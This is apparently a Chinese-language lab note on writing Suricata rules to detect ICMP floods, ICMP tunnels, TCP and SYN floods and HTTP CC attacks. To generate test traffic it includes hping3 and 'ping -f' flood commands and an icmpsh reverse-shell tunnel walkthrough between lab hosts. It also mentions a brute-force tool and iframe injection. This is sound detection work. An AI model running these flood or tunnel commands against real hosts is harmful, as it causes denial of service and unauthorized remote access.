[TOC]



# ==Suricata检测TCP和ICMP==

#### 一、ICMP流量识别

##### 1、正常的ICMP流量

![image-20250219221326352](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219221326352.png)

说明，正常情况，windows 的icmp数据包，默认大小是 74 字节，有效载荷大小是 32 字节

![image-20250219221529204](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219221529204.png)

而Linux 系统默认icmp大小为 98 字节，有效载荷大小是 48 字节，而且，windows的有效载荷和Linux的有效载荷内容是不一样的

相同点是，icmp 的 request 包的 type 都是 8，icmp 的 response 包的 type 都是 0。

##### 2、基于ICMP的Ping攻击

两个核心点：dsize的大小和持续连接的次数（itype不为8）

```yaml
alert icmp any any -> $HOME_NET any (msg:"ICMP载荷过大."; dsize: >200; sid: 5621001;)

# alert icmp any any -> $HOME_NET any (msg:"ICMP载荷过大."; dsize: >200; flowint: datasize, notset; flowint: datasize, =, 1; noalert; sid: 5621002;)
# alert icmp any any -> $HOME_NET any (msg:"ICMP载荷过大."; dsize: >200; flowint: datasize, isset; flowint: datasize, +, 1; noalert; sid: 5621003;)
# alert icmp any any -> $HOME_NET any (msg:"ICMP载荷过大，次数过多."; dsize: >200; flowint: datasize, >=, 5; sid: 5621004;)

alert icmp any any -> $HOME_NET any (msg:"ICMP死亡Ping."; itype: 8; threshold: type both, track by_src, count 50, seconds 2; sid: 5621005;)

alert icmp any any -> $HOME_NET any (msg:"疑似ICMP隧道通信."; dsize: >100; threshold: type both, track by_src, count 50, seconds 5; sid: 5621006;)
```

可以使用命令：

```shell
ping -f 192.168.112.215
hping3 --icmp --flood 192.168.112.215
```

测试内容如下：

**注意：icmp协议测试的时候，千万不要写 $HTTP_PORTS 这样会导致检测根本检测不上，因为icmp没有端口的概念**

针对 `alert icmp $EXTERNAL_NET any <> $HOME_NET any (msg:"ICMP载荷过大"; dsize:>185; classtype:icmp-attempt-attack; sid:5619001; rev:1;)` 测试结果如下：

![image-20250219233811687](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219233811687.png)

`alert icmp any any -> $HOME_NET any (msg:"ICMP死亡Ping."; itype: 8; threshold: type both, track by_src, count 50, seconds 2; sid: 5621005;)` 结果如下：

![image-20250219235134630](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219235134630.png)

![image-20250219235145611](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219235145611.png)

##### 3、ICMP隧道通信流量

ICMP隧道流量所具备特征：

（1）ICMP隧道短时间会产生大量 ICMP 数据包，用来数据发送，可能存在大于 64 比特的数据包。

（2）ICMP隧道发送的 ICMP 数据包前后Data字段不一样，而且响应数据包中 payload 跟请求数据包不一致。

（3）ICMP 数据包的协议标签可能存在特殊字段。

（4）Data 里面可能存在一些系统命令。

我们知道，我们利用 icmp 的攻击方式，比如：

- icmp 隧道搭建（icmpsh）

  > 比如，我在 win server 2016（192.168.230.130） 与 kali（192.168.230.128） 直接单间 icmp 隧道，我们来看一下什么情况
  >
  > - 首先，在 kali 上运行 
  >
  >   ```
  >   sysctl -w net.ipv4.icmp_echo_ignore_all=1 # 设置为0即可还原
  >   #因为icmpsh工具要代替系统本身的ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP答应（如果要恢复系统答应，则设置为0），否则Shell的运行会不稳定。
  >   
  >   ./icmpsh_m.py 192.168.230.128 192.168.230.130
  >   ```
  >
  >   > 目前Python2.7的版本已经不是Kali系统的默认设置，Kali最新版本运行python或pip命令时，均使用的是Python3的版本，而icmpsh的Python脚本依然支持的是Python2，所以需要先安装Python2.7的pip命令：
  >   >
  >   > ```
  >   > # curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py 
  >   > # python2 get-pip.py
  >   > ```
  >   >
  >   > 并将pip2导出到环境变量中：export PATH=/home/denny/.local/bin:$PATH
  >   >
  >   > 如果提示：ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.的错误，说明PIP和setuptools没有更新到最新版本，运行以下命令完成更新：
  >   >
  >   > ```
  >   > # pip install --upgrade pip
  >   > # pip install --upgrade setuptools
  >   > ```
  >   >
  >   > 如果提示：You need to install Python Impacket library first，则运行以下命令序列，先行安装依赖。
  >   >
  >   > ```
  >   > # pip install impacket  安装完成后再次尝试，如果清空有问题，尝试以下操作：
  >   > # git clone https://github.com/SecureAuthCorp/impacket.git
  >   > # cd impacket# pip install -r requirements.txt
  >   > # python setup.py install
  >   > ```
  >   >
  >
  > - 然后，在 win server 2016 上运行 `icmpsh.exe -t 192.168.230.128` 
  >
  >   ![image-20250220002321789](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250220002321789.png)
  >
  > - 看 kali 是否反弹监听到了 win server 2016 的shell
  >
  >   ![image-20250220002514026](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250220002514026.png)
  >
  >   ![image-20250220002538269](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250220002538269.png)
  >
  > - 观测icmp隧道的流量情况
  >
  >   ![image-20250220002631818](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250220002631818.png)
  >
  >   我们发现大小一直在变，而且我们想，当数据传输的即将结束的时候，比如只剩下10个字节的内容没传完，要放在最后一个数据包，那最后一个数据包的大小是不是会很小，比普通的icmp数据包还小。那如果，数据包的大小小于 windows 的默认的 74，那我们是不是就可以认为icmp数据包异常。

- icmp flood 泛洪（ping -f）

  ![image-20250219235806177](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250219235806177.png)

  - windows 的 ping 命令：

    `-l` 参数是设置大小，并且没有 -f 参数

  - Linux 的 ping 命令：

    `-s` 参数是设置大小，并且带有 -f 参数，可进行 flood 

- ...

##### 4、Suricata检测规则

两个核心点：dsize过大或过小（dsize: <32; ），持续连接的次数，也可以附属参考一下ttl, seq等附加属性。

```yaml
alert icmp any any -> $HOME_NET any (msg:"ICMP载荷过大，次数过多."; itype: 8; threshold: type threshold, track by_src, count 20, seconds 30; sid: 5621006;)
```

> hping3可以模拟ping泛洪，并且支持rand-source（随机源IP），所以在设定阈值时需要注意 threshold 的阈值有可能要低于实际情况。与之类似的，TCP的连接也无法建议，因为源IP不存在。**这就是suricata的一个弱点，攻击者使用随机ip进行ddos，又该如何应对呢**
>
> 也可以使用content和pcre进行内容的过滤（不加密，内容可控）

#### 二、TCP流量识别

##### 1、TCP Flood

注意因为这是正常的TCP通信流量，所以阈值的设定一定要比常规访问时的阈值要高，最好高多一点。可以通过hping3进行泛洪测试，进而与正常流量进行比较，定义出来一个阈值。

```yaml
alert tcp any any -> $HOME_NET any (msg: "TCP泛洪"; flow: established, to_server; threshold: type threshold, track by_src, count 20, seconds 1; sid: 5622001; rev: 1;)
```

> 以上实验可以使用 SNETCracker 来暴破的方式实现TCP全连接。
>
> flow: established, to_server; 表示匹配连接是否建立成功

##### 2、SYN Flood

```yaml
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SYN Flood"; flags:S; flow: stateless, to_server; dsize:>100; threshold: type both, count 20, seconds 120, track by_src; classtype:attempted-dos; sid:5622003; rev:1;)
```

> 可以使用命令： hping3 -S -p 80 192.168.112.130 来进行非泛洪模式下的测试，通过后再进行泛洪
>
> flags:S; 表示匹配SYN数据包
>
> ### 1. **`stateless`（无状态）**
>
> - **作用**：绕过Snort的流状态跟踪机制，强制规则匹配**所有符合条件的数据包**，无论TCP连接是否建立。
>
> - 应用场景
>
>   - 不验证 TCP 三次握手是否完成
>   - 忽略流的序列号（SEQ/ACK）校验
>   - 适用于检测**无状态协议**（如 UDP/ICMP）或**异常流量**（如碎片攻击、协议违规）
>
>   - 检测可能绕过流处理器（如TCP流重组）的异常流量（如畸形包、碎片攻击）
>   - 分析无连接协议（如UDP）或伪造连接状态的攻击（如SYN洪水攻击）
>
> ------
>
> ### 2. **`to_server`（到服务器）**
>
> - **作用**：规则仅匹配**客户端发往服务器的请求流量**。
>
> - 技术细节
>
>   - 对于 TCP/UDP：源端口为客户端端口（通常 >1024），目标端口为服务端口（如 80/443）
>   - 对于 ICMP：匹配请求（`Echo Request`）而非响应（`Echo Reply`）
>
>   - 在TCP中匹配 `SYN` 未建立时的初始请求
>   - 在UDP/ICMP中匹配源端口为客户端、目的端口为服务的流量
>   - 有效区分内网客户端请求与外网服务响应（避免误报）
>
> 所以
>
> `flow:stateless, to_server; ` 表示：
>
> 1. **忽略 TCP 流状态**（即使连接未建立也会触发）
> 2. 仅分析**客户端发往服务器**的请求（如 HTTP GET 请求）

针对随机IP，除了单纯地检测请求外，最好再继续检测响应：SYN -> SYN+ACK -> ACK

```
* F : FIN - 结束; 结束会话
* S : SYN - 同步; 表示开始会话请求
* R : RST - 复位;中断一个连接
* P : PUSH - 推送; 数据包立即发送
* A : ACK - 应答* U : URG - 紧急
* E : ECE - 显式拥塞提醒回应
* W : CWR - 拥塞窗口减少
```

##### 3、CC攻击

> Challenge Collapsar的缩写，目的是耗尽目标资源导致拒绝服务。CC攻击的前身是Fatboy
>
> CC攻击属于应用层，而DDoS是网络层，CC攻击更隐蔽，模拟正常用户请求，防御更难。
>
> ### 一、定义与起源
>
> 1. **名称来源**
>     CC全称 **Challenge Collapsar**（挑战黑洞），最初是为了绕过早期DDoS防护设备“黑洞”（Collapsar）而设计的攻击方式 
> 2. **攻击目标** 主要针对 **Web服务（OSI第7层）**，如网站、API接口、登录页面等，尤其是高并发、高计算资源消耗的场景（如数据库查询） 
>
> ------
>
> ### 二、攻击原理
>
> 1. **资源耗尽逻辑**
>    - 攻击者通过代理服务器或僵尸网络（肉鸡）发起大量请求，模仿正常用户访问（如HTTP请求）
>    - 这些请求通常针对高计算资源消耗的URL（如动态页面、复杂查询），导致服务器CPU、内存或数据库连接池耗尽
> 2. **技术特点**
>    - 隐蔽性：请求模拟合法流量，难以通过传统防火墙过滤
>    - 低成本性：攻击者通过断开与代理的连接，仅需少量资源即可发起大规模攻击
>
> **示例场景**：
>  攻击者黑入高流量网站，在页面嵌入恶意代码（如`<iframe src="目标网站">`），利用正常用户访问时自动向目标网站发送海量请求 
>
> ------
>
> ### 三、与DDoS攻击的区别
>
> | **特征**     | **CC攻击**             | **DDoS攻击**               | 来源 |
> | ------------ | ---------------------- | -------------------------- | ---- |
> | **攻击层级** | 应用层（HTTP/HTTPS）   | 网络层（流量洪泛）         | 1 4  |
> | **攻击规模** | 通常单机或少量代理发起 | 依赖大规模僵尸网络协同攻击 | 1 4  |
> | **防御难度** | 更隐蔽，需行为分析     | 可通过流量清洗设备拦截     | 2 3  |
> | **资源消耗** | 主要耗尽服务器计算资源 | 主要耗尽网络带宽           | 1 5  |
>
> ------
>
> ### 四、典型攻击症状
>
> 1. **服务异常**
>
>    - 网站响应变慢或返回502/503错误动态页面（如PHP）出现“Server Too Busy”提示
>    - 服务器CPU/内存占用率突然飙升至90%以上
>
> 2. **网络特征**
>
>    - 通过
>
>      ```
>      netstat -an
>      ```
>
>       可发现大量SYN_RECEIVED状态连接，且IP来源分散
>
>    - Web日志中单一IP对特定URL（如登录页）的高频访问记录
>
> ------
>
> ### 五、防御方向（简要）
>
> 1. 流量识别：通过限制IP请求频率、引入人机验证（如验证码）区分正常用户
> 2. 资源优化：静态化页面、使用CDN分担流量
> 3. 基础设施：部署Web应用防火墙（WAF）、高防CDN进行流量清洗

```yaml
alert http any any -> $HOME_NET any (msg:"CC攻击"; flow:established,to_server; threshold: type both, track by_src, count 20, seconds 1; http.method; content:"GET"; http.uri; content:"/?id="; sid: 5622005; rev: 1;)
```

> 使用hping3和wrk可进行测试